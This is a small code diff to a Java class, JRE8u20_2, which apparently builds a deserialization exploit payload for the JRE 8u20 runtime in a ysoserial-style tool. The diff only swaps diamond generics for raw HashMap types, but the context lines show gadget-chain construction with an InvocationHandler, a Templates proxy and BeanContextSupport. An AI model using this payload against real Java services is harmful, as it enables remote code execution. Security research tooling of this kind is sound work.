@@ -41,14 +41,14 @@ public class JRE8u20_2 implements ObjectPayload<Object> {
 		Class       ihClass     = newInvocationHandlerClass();
 		Constructor constructor = ihClass.getDeclaredConstructor(Class.class, Map.class);
 		constructor.setAccessible(true);
-		InvocationHandler ih = (InvocationHandler) constructor.newInstance(Override.class, new HashMap<>());
+		InvocationHandler ih = (InvocationHandler) constructor.newInstance(Override.class, new HashMap());
 
 		Reflections.setFieldValue(ih, "type", Templates.class);
 		Templates proxy = Gadgets.createProxy(ih, Templates.class);
 
 		BeanContextSupport b = new BeanContextSupport();
 		Reflections.setFieldValue(b, "serializable", 1);
-		HashMap tmpMap = new HashMap<>();
+		HashMap tmpMap = new HashMap();
 		tmpMap.put(ih, null);
 		Reflections.setFieldValue(b, "children", tmpMap);
 
